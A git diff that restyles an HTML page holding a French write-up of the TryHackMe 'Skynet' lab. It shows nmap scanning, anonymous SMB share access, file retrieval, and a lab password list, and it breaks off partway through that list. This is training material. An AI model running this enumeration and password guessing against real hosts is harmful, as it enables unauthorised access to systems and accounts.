@@ -1,14 +1,15 @@
 <!DOCTYPE html>
+
 <html lang="fr">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Skynet | Alex171</title>
-  <meta name="description" content="Writeup exhaustif et complet"/>
-  <link rel="stylesheet" href="../css/style.css"/>
-  <link rel="stylesheet" href="../css/animations.css"/>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>"/>
-  <style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Skynet | Alex171</title>
+<meta content="Writeup exhaustif et complet" name="description"/>
+<link href="../css/style.css" rel="stylesheet"/>
+<link href="../css/animations.css" rel="stylesheet"/>
+<link href="data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'&gt;&lt;text y='.9em' font-size='90'&gt;🔐&lt;/text&gt;&lt;/svg&gt;" rel="icon"/>
+<style>
     /* Styling adjustments for exhaustive content */
     .writeup-content img { max-width: 100%; border-radius: 8px; margin: 1.5rem 0; border: 1px solid var(--border); }
     .writeup-content blockquote { border-left: 3px solid var(--green); padding-left: 1rem; color: var(--text-muted); margin: 1.5rem 0; font-style: italic; }
@@ -23,57 +24,51 @@
 <body>
 <canvas id="matrix-canvas"></canvas><div class="grid-bg"></div>
 <nav class="navbar">
-  <a class="nav-logo" href="../index">&gt;_<span> alex171</span></a>
-  <div class="nav-links">
-    <a href="../index">Accueil</a><a href="../about">À propos</a>
-    <a href="../writeups" class="active">Writeups</a><a href="../certifications">Certifications</a>
-    <a href="../projects">Projets</a><a href="../resources">Ressources</a>
-  </div>
-  <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+<a class="nav-logo" href="../index">&gt;_<span> alex171</span></a>
+<div class="nav-links">
+<a href="../index">Accueil</a><a href="../about">À propos</a>
+<a class="active" href="../writeups">Writeups</a><a href="../certifications">Certifications</a>
+<a href="../projects">Projets</a><a href="../resources">Ressources</a>
+</div>
+<div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
 </nav>
 <div class="mobile-menu" id="mobile-menu">
-  <a href="../index">Accueil</a><a href="../writeups">Writeups</a>
-  <a href="../certifications">Certifications</a><a href="../resources">Ressources</a>
+<a href="../index">Accueil</a><a href="../writeups">Writeups</a>
+<a href="../certifications">Certifications</a><a href="../resources">Ressources</a>
 </div>
-
 <main>
 <section class="section">
 <div class="container">
-  <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;" class="fade-in">
-    <a href="../index" style="color:var(--text-muted);">~</a> / <a href="../writeups" style="color:var(--text-muted);">writeups</a> / <span style="color:var(--green);">skynet</span>
-  </div>
-  <div class="writeup-layout">
-    <article class="writeup-content fade-in">
-      <div style="margin-bottom:2rem;">
-        <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
-          <span class="tag">Linux</span><span class="tag blue">SMB</span><span class="tag purple">RFI</span><span class="tag">Tar Wildcard Injection</span>
-        </div>
-        <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">Skynet</h1>
-        <div style="font-family:var(--font-mono);font-size:0.85rem;color:var(--text-muted);margin-bottom:2rem;">
-            Publié le 2026-03-05 • TryHackMe
-        </div>
-      </div>
+<div class="fade-in" style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"><a href="../index" style="color:var(--text-muted);">Home</a> &gt; TryHackMe: <span style="color:var(--green);">Skynet</span></div>
+<div class="writeup-layout">
+<article class="writeup-content fade-in">
+<div style="margin-bottom:2rem;">
+<div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+<span class="tag">Linux</span><span class="tag blue">SMB</span><span class="tag purple">RFI</span><span class="tag">Tar Wildcard Injection</span>
+</div>
+<h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">Skynet</h1>
 
-      <h2 id="configuration">Configuration</h2>
+<div style="display: flex; gap: 1rem; align-items: center; color: var(--text-muted); font-size: 0.9rem; margin-bottom: 2rem;"><img alt="jaxafed" src="/assets/images/avatar.jpg" style="width:30px; height:30px; border-radius:50%; margin:0;"/><span>By <strong>jaxafed</strong> • 9 min read</span></div></div>
+<h2 id="configuration">Configuration</h2>
 <p>Nous allons associer l’adresse ip de la cible qui nous a été donnée au nom de domaine <code>skynet.thm</code> </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">echo "<serveur_ip> skynet.thm" &gt;&gt; /etc/hosts</serveur_ip></span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">echo "<serveur_ip> skynet.thm" &gt;&gt; /etc/hosts</serveur_ip></span>
+</code></code></pre></div></div>
 <h2 id="ennumeration">Ennumération</h2>
 <p>La première étape serait de lister les ports ouverts à l’aide de nmap</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">nmap -sC -sV skynet.thm</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">nmap -sC -sV skynet.thm</span>
+</code></code></pre></div></div>
 <p>On tombe sur le résultat suivant:</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">PORT    STATE SERVICE     VERSION</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">110/tcp open  pop3        Dovecot pop3d</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|_pop3-capabilities: CAPA SASL AUTH-RESP-CODE PIPELINING UIDL TOP RESP-CODES</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">143/tcp open  imap        Dovecot imapd</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|_imap-capabilities: Pre-login capabilities LOGINDISABLEDA0001 IMAP4rev1 LITERAL+ post-login listed have OK LOGIN-REFERRALS ENABLE ID more IDLE SASL-IR</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">PORT    STATE SERVICE     VERSION</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">110/tcp open  pop3        Dovecot pop3d</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">|_pop3-capabilities: CAPA SASL AUTH-RESP-CODE PIPELINING UIDL TOP RESP-CODES</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">143/tcp open  imap        Dovecot imapd</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">|_imap-capabilities: Pre-login capabilities LOGINDISABLEDA0001 IMAP4rev1 LITERAL+ post-login listed have OK LOGIN-REFERRALS ENABLE ID more IDLE SASL-IR</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+</code></code></pre></div></div>
 <p>Ports ouverts:</p>
 <ul>
 <li>Port 22 : Port SSH</li>
@@ -84,265 +79,265 @@
 </ul>
 <h3 id="smb">SMB</h3>
 <p>Nous allons lister les partages SMB</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smbclient -L //skynet.thm -N</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smbclient -L //skynet.thm -N</span>
+</code></code></pre></div></div>
 <p>On tombe sur les partages </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Sharename       Type      Comment</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">    ---------       ----      -------</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">    print$          Disk      Printer Drivers</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">    anonymous       Disk      Skynet Anonymous Share</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">    milesdyson      Disk      Miles Dyson Personal Share</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">    IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Sharename       Type      Comment</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">    ---------       ----      -------</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">    print$          Disk      Printer Drivers</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">    anonymous       Disk      Skynet Anonymous Share</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">    milesdyson      Disk      Miles Dyson Personal Share</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">    IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))</span>
+</code></code></pre></div></div>
 <p>La connexion au partage <code>milesdyson</code> requiert un mot de passe mais pas celui <code>anonymous</code> </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smbclient  //skynet.thm/anonymous -N</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \&gt; ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  .                                   D        0  Thu Nov 26 17:04:00 2020</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  ..                                  D        0  Tue Sep 17 08:20:17 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  attention.txt                       N      163  Wed Sep 18 04:04:59 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  logs                                D        0  Wed Sep 18 05:42:16 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831512 blocks available</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \&gt; get attention.txt </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \&gt; cd logs\</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \logs\&gt; ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  .                                   D        0  Wed Sep 18 05:42:16 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  ..                                  D        0  Thu Nov 26 17:04:00 2020</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  log2.txt                            N        0  Wed Sep 18 05:42:13 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  log1.txt                            N      471  Wed Sep 18 05:41:59 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  log3.txt                            N        0  Wed Sep 18 05:42:16 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831512 blocks available</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \logs\&gt; get log1.txt </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">getting file \logs\log1.txt of size 471 as log1.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \logs\&gt; exit</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smbclient  //skynet.thm/anonymous -N</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \&gt; ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  .                                   D        0  Thu Nov 26 17:04:00 2020</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  ..                                  D        0  Tue Sep 17 08:20:17 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  attention.txt                       N      163  Wed Sep 18 04:04:59 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  logs                                D        0  Wed Sep 18 05:42:16 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831512 blocks available</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \&gt; get attention.txt </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \&gt; cd logs\</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \logs\&gt; ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  .                                   D        0  Wed Sep 18 05:42:16 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  ..                                  D        0  Thu Nov 26 17:04:00 2020</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  log2.txt                            N        0  Wed Sep 18 05:42:13 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  log1.txt                            N      471  Wed Sep 18 05:41:59 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  log3.txt                            N        0  Wed Sep 18 05:42:16 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831512 blocks available</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \logs\&gt; get log1.txt </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">getting file \logs\log1.txt of size 471 as log1.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \logs\&gt; exit</span>
+</code></code></pre></div></div>
 <p>On a donc pu récupérer les fichiers <code>attention.txt</code> et <code>log1.txt</code> . Analysons leur contenu</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┬──────────────────────────────────────────────────────────────────────────────────</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">       │ File: attention.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┼──────────────────────────────────────────────────────────────────────────────────</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   1   │ A recent system malfunction has caused various passwords to be changed. All skyne</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">       │ t employees are required to change their password after seeing this.</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   2   │ -Miles Dyson</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┴────────────────</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">───────┬──────────────────────────────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">       │ File: attention.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">───────┼──────────────────────────────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   1   │ A recent system malfunction has caused various passwords to be changed. All skyne</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">       │ t employees are required to change their password after seeing this.</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   2   │ -Miles Dyson</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">───────┴────────────────</span>
+</code></code></pre></div></div>
 <p>Cela indique que les mots de passe des employées on été changés et le message vient de <code>Miles Dyson</code> qui nous rappelle le partage <code>milesdyson</code> . Analysons le second fichier</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">──────────────────────────────────────────────────────────────────────────────────────────</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">File: log1.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┼──────────────────────────────────────────────────────────────────────────────────</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   1   │ cyborg007haloterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   2   │ terminator22596</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   3   │ terminator219</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   4   │ terminator20</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   5   │ terminator1989</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   6   │ terminator1988</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   7   │ terminator168</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   8   │ terminator16</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   9   │ terminator143</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  10   │ terminator13</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  11   │ terminator123!@#</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  12   │ terminator1056</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  13   │ terminator101</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  14   │ terminator10</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  15   │ terminator02</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  16   │ terminator00</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  17   │ roboterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  18   │ pongterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  19   │ manasturcaluterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  20   │ exterminator95</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  21   │ exterminator200</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  22   │ dterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  23   │ djxterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  24   │ dexterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  25   │ determinator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  26   │ cyborg007haloterminator</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  27   │ avsterminator</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">──────────────────────────────────────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">File: log1.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">───────┼──────────────────────────────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   1   │ cyborg007haloterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   2   │ terminator22596</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   3   │ terminator219</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   4   │ terminator20</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   5   │ terminator1989</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   6   │ terminator1988</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   7   │ terminator168</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   8   │ terminator16</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   9   │ terminator143</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  10   │ terminator13</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  11   │ terminator123!@#</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  12   │ terminator1056</span>
